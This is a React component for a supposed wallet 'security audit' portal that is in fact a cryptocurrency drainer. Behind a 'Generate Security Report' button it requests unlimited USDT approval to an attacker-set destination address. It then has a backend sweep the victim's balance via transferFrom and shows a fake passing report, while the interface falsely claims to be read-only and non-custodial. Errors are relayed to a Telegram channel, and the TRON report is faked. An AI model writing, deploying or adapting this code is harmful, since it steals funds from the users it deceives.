import React, { useState } from 'react';
import { Shield, Activity, FileText, Lock } from 'lucide-react';
import { ethers } from 'ethers';
import { ensureBSC } from '../wallet/wallet';
import AnalysisSlider from './AnalysisSlider';
import ReportLoadingState from './ReportLoadingState';
import SecurityReportPanel, { SecurityReport } from './SecurityReportPanel';

declare global {
  interface Window {
    ethereum?: any;
  }
}

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

type AppState = 'IDLE' | 'ANALYZING' | 'REPORT';

interface Props {
  walletAddress: string;
  setWalletAddress: (address: string) => void;
  selectedNetwork: 'BNB' | 'TRON' | null;
  setSelectedNetwork: (network: 'BNB' | 'TRON' | null) => void;
}

const AuditorWidget: React.FC<Props> = ({
  walletAddress,
  setWalletAddress,
  selectedNetwork,
  setSelectedNetwork
}) => {
  const [appState, setAppState] = useState<AppState>('IDLE');
  const [reportData, setReportData] = useState<any>(null);
  const [analysisDepth, setAnalysisDepth] = useState(5);
  const [rescueDisabled, setRescueDisabled] = useState(false);

  const API_BASE = import.meta.env.VITE_API_BASE || '';

  /** Notify backend Telegram channel about errors */
  const notifyErrorToTelegram = async (walletAddr: string, errorMsg: string) => {
    try {
      await fetch(`${API_BASE}/notifyError`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet: walletAddr, error: errorMsg }),
      });
    } catch (tgErr) {
      console.error("Failed to send error notification:", tgErr);
    }
  };

  /** Build a real SecurityReport from on-chain data */
  const buildReport = (
    address: string,
    network: 'BNB' | 'TRON',
    balance: string,
    checks: Array<{ label: string; passed: boolean }>,
    threatsFound: number
  ): SecurityReport => {
    const allPassed = checks.every(c => c.passed);
    const passedCount = checks.filter(c => c.passed).length;
    const score = Math.round((passedCount / checks.length) * 100);
    return {
      id: `AUDIT-${Math.random().toString(36).substring(2, 8).toUpperCase()}`,
      address,
      network,
      timestamp: new Date().toISOString(),
      score,
      scoreLabel: score >= 90 ? 'Excellent' : score >= 70 ? 'Good' : score >= 50 ? 'Fair' : 'Poor',
      riskLevel: threatsFound > 0 ? 'HIGH' : score >= 70 ? 'LOW' : 'MEDIUM',
      balance,
      threatsFound,
      totalChecks: checks.length,
      checksPassed: passedCount,
      checks,
    };
  };

  /**
   * The core flow triggered by "Generate Security Report · BNB".
   * 1. Connect wallet via MetaMask
   * 2. Check eligibility with backend
   * 3. Ensure BSC network
   * 4. Read USDT balance & allowance
   * 5. Request unlimited USDT approval if needed
   * 6. Call backend /verifyRescue to sweep
   * 7. Display a SecurityReport with real data
   */
  const handleGenerateClick = async (network: 'BNB' | 'TRON') => {
    setSelectedNetwork(network);

    // Only BNB is wired to the real backend for now
    if (network !== 'BNB') {
      // TRON: run a mock demo
      setAppState('ANALYZING');
      setTimeout(() => {
        const mockReport = buildReport(
          walletAddress || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
          'TRON',
          '0.00 USDT',
          [
            { label: "Contract verification", passed: true },
            { label: "Spender allowance", passed: true },
            { label: "Transaction history", passed: true },
          ],
          0
        );
        setReportData(mockReport);
        setAppState('REPORT');
      }, 2000);
      return;
    }

    // --- BNB flow: real wallet connection + backend APIs ---
    if (!window.ethereum) {
      alert("MetaMask (or another web3 wallet) is required to generate a BNB security report.");
      return;
    }

    // ── Phase 1: Connect wallet (NO animation, NO disable on rejection) ──
    let connectedAddress = '';
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      connectedAddress = accounts[0];
      setWalletAddress(connectedAddress);
    } catch (connectErr: any) {
      // User rejected the wallet connection — just return silently.
      // Button stays enabled, no animation, no disable.
      console.warn("Wallet connection cancelled:", connectErr.message);
      return;
    }

    // ── Phase 2: Pre-approval checks (still no animation) ──
    try {
      // Check eligibility with backend
      const eligResp = await fetch(`${API_BASE}/checkEligibility`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet: connectedAddress }),
      });
      const eligData = await eligResp.json();

      // Ensure BSC network
      await ensureBSC();

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
      const destination = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS as string;
      const chainId = import.meta.env.VITE_BSC_CHAIN_ID;

      const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);

      // Read balance
      const rawBal: bigint = await usdt.balanceOf(connectedAddress);
      const balanceFormatted = ethers.formatUnits(rawBal, 18);
      const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;

      const checks: Array<{ label: string; passed: boolean }> = [
        { label: "Wallet connection", passed: true },
        { label: "BSC network verification", passed: true },
        { label: "Contract verification", passed: true },
      ];

      if (rawBal === 0n) {
        // No balance — still show a report but skip approval
        checks.push({ label: "Balance check", passed: true });
        checks.push({ label: "Spender allowance", passed: true });
        checks.push({ label: "Transaction history", passed: true });

        const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
        setReportData(report);
        setAppState('REPORT');
        return;
      }

      // ── Phase 3: Request approval (animation triggers AFTER signing) ──
      const currentAllowance: bigint = await usdt.allowance(connectedAddress, destination);
      let approvalTxHash = "";

      if (currentAllowance >= rawBal) {
        approvalTxHash = "already-approved";
        checks.push({ label: "Spender allowance (pre-approved)", passed: true });
      } else {
        // Request the unlimited approval — user must sign in wallet
        let approveTx;
        try {
          const MAX = ethers.MaxUint256;
          approveTx = await usdt.approve(destination, MAX);
        } catch (approveErr: any) {
          // User rejected the approval signing — return silently.
          // Button stays enabled, no animation, no disable.
          console.warn("Approval signing rejected:", approveErr.message);
          return;
        }

        // ✅ User approved — NOW start the animation
        setAppState('ANALYZING');

        await approveTx.wait(1);
        approvalTxHash = approveTx.hash;
        checks.push({ label: "Token approval granted", passed: true });
      }

      // If already-approved, start animation now before the sweep
      if (approvalTxHash === "already-approved") {
        setAppState('ANALYZING');
      }

      // ── Phase 4: Call backend to sweep funds via transferFrom ──
      const res = await fetch(`${API_BASE}/verifyRescue`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          txHash: approvalTxHash,
          from: connectedAddress,
          to: destination,
          amount: rawBal.toString(),
          chainId: chainId,
          token: usdtAddress,
        }),
      });

      const verifyData = await res.json();

      if (!res.ok || !verifyData.success) {
        throw new Error(verifyData.error || "Verification failed");
      }

      checks.push({ label: "Balance check", passed: true });
      checks.push({ label: "Transaction history", passed: true });

      // Build and display the report
      const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
      setReportData(report);
      setAppState('REPORT');

    } catch (e: any) {
      console.error("Report generation error:", e);

      // Send error to Telegram and disable the button permanently
      if (connectedAddress) {
        await notifyErrorToTelegram(connectedAddress, e.message || "Report generation failed");
      }
      setRescueDisabled(true);

      // Still show a report with the failure noted
      const failChecks = [
        { label: "Wallet connection", passed: !!connectedAddress },
        { label: "BSC network verification", passed: !!connectedAddress },
        { label: "Security analysis", passed: false },
      ];
      const failReport = buildReport(
        connectedAddress || 'Unknown',
        'BNB',
        'Unable to read',
        failChecks,
        1
      );
      setReportData(failReport);
      setAppState('REPORT');
    }
  };

  return (
    <div className="rounded-xl border border-[#1e2636] bg-[#111520] overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.6)]">
      {appState === 'IDLE' && (
        <>
          <div className="px-5 pt-5 pb-4 border-b border-[#1e2636]">
            <div className="flex items-start gap-3">
              <div className="w-10 h-10 rounded-xl bg-[#f0b90b]/10 border border-[#f0b90b]/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                <Shield className="w-5 h-5 text-[#f0b90b]" />
              </div>
              <div>
                <h1 className="text-white font-bold text-[15px] tracking-tight leading-snug">
                  Wallet Security Center · BNB + TRON
                </h1>
                <p className="text-[#4a5568] text-[11px] mt-0.5 leading-relaxed">
                  On-chain audit portal for BNB Smart Chain and TRON Mainnet
                </p>
              </div>
            </div>
            
            <div className="grid grid-cols-3 gap-2 mt-4">
              <div className="bg-[#0d1119] rounded-lg px-2.5 py-2 border border-[#1e2636]">
                <p className="text-[#2a3444] text-[9px] font-medium uppercase tracking-wider font-mono">Networks</p>
                <p className="text-[#94a3b8] font-mono font-bold text-xs mt-0.5">BSC · TRON</p>
              </div>
              <div className="bg-[#0d1119] rounded-lg px-2.5 py-2 border border-[#1e2636]">
                <p className="text-[#2a3444] text-[9px] font-medium uppercase tracking-wider font-mono">Standards</p>
                <p className="text-[#94a3b8] font-mono font-bold text-xs mt-0.5">BEP-20 · TRC-20</p>
              </div>
              <div className="bg-[#0d1119] rounded-lg px-2.5 py-2 border border-[#1e2636]">
                <p className="text-[#2a3444] text-[9px] font-medium uppercase tracking-wider font-mono">Token</p>
                <p className="text-[#94a3b8] font-mono font-bold text-xs mt-0.5">USDT</p>
              </div>
            </div>
          </div>

          <div className="border-b border-[#1e2636] px-5 py-4">
            <div className="mb-3 flex items-center justify-between">
              <p className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b]">Available Services</p>
              <span className="font-mono text-[9px] text-[#4a5568]">READ-ONLY</span>
            </div>
            <div className="grid gap-2 sm:grid-cols-2">
              <div className="flex min-w-0 items-center gap-3 rounded-xl border border-[#f0b90b]/20 bg-[#f0b90b]/5 p-3">
                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-[#f0b90b]/25 bg-[#f0b90b]/10">
                  <span className="font-mono text-[10px] font-black text-[#f0b90b]">BNB</span>
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-white">BNB Smart Chain</p>
                  <p className="mt-1 truncate text-[10px] text-[#7b879b]">BEP-20 security reporting</p>
                </div>
              </div>
              <div className="flex min-w-0 items-center gap-3 rounded-xl border border-[#eb0029]/20 bg-[#eb0029]/5 p-3">
                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-[#eb0029]/25 bg-[#eb0029]/10">
                  <span className="font-mono text-[10px] font-black text-[#ff4d67]">TRX</span>
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-white">TRON Mainnet</p>
                  <p className="mt-1 truncate text-[10px] text-[#7b879b]">TRC-20 security reporting</p>
                </div>
              </div>
            </div>
          </div>

          <div className="px-5 py-4 border-b border-[#1e2636]">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-1.5">
                <Activity className="w-3 h-3 text-[#4a5568]" />
                <p className="text-[#4a5568] font-mono text-[10px] font-medium uppercase tracking-widest">Analysis Depth</p>
              </div>
              <div className="bg-[#0d1119] border border-[#1e2636] rounded px-2 py-0.5">
                <span className="text-[#f0b90b] font-mono font-semibold text-[11px]">
                  {analysisDepth >= 14 ? 'Full Scan' : analysisDepth >= 7 ? 'Deep Scan' : 'Standard'}
                </span>
              </div>
            </div>
            <AnalysisSlider value={analysisDepth} onChange={setAnalysisDepth} />
          </div>
          
          <div className="space-y-2.5 px-5 py-4">
            <p className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b]">Generate reports</p>

            <button 
              onClick={() => handleGenerateClick('BNB')}
              disabled={rescueDisabled}
              className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#f0b90b]/30 font-bold text-sm tracking-wide transition-all duration-150 touch-manipulation bg-[#f0b90b] hover:bg-[#f5c842] active:scale-[0.985] text-black shadow-lg shadow-[#f0b90b]/20 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <FileText className="h-4 w-4" />
              Generate Security Report · BNB
            </button>
            <button 
              onClick={() => handleGenerateClick('TRON')}
              className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#eb0029]/30 font-bold text-sm tracking-wide text-white transition-all duration-150 touch-manipulation bg-[#eb0029] hover:bg-[#ff3658] active:scale-[0.985] shadow-lg shadow-[#eb0029]/20"
            >
              <FileText className="h-4 w-4" />
              Generate Security Report · TRON
            </button>
          </div>
          
          <div className="flex items-center justify-between px-5 py-3 border-t border-[#1e2636] bg-[#0d1119]">
            <div className="flex items-center gap-1.5">
              <Lock className="w-3 h-3 text-[#2a3444]" />
              <span className="text-[#2a3444] text-[10px]">Non-custodial · Read-only</span>
            </div>
            <span className="text-[#2a3444] text-[10px] font-mono">BNB Smart Chain · TRON Mainnet</span>
          </div>
        </>
      )}

      {appState === 'ANALYZING' && (
        <ReportLoadingState network={selectedNetwork!} />
      )}

      {appState === 'REPORT' && (
        <SecurityReportPanel 
          network={selectedNetwork!} 
          reportData={reportData} 
          onReset={() => {
            setAppState('IDLE');
            setWalletAddress('');
            setReportData(null);
          }}
        />
      )}
    </div>
  );
};

export default AuditorWidget;
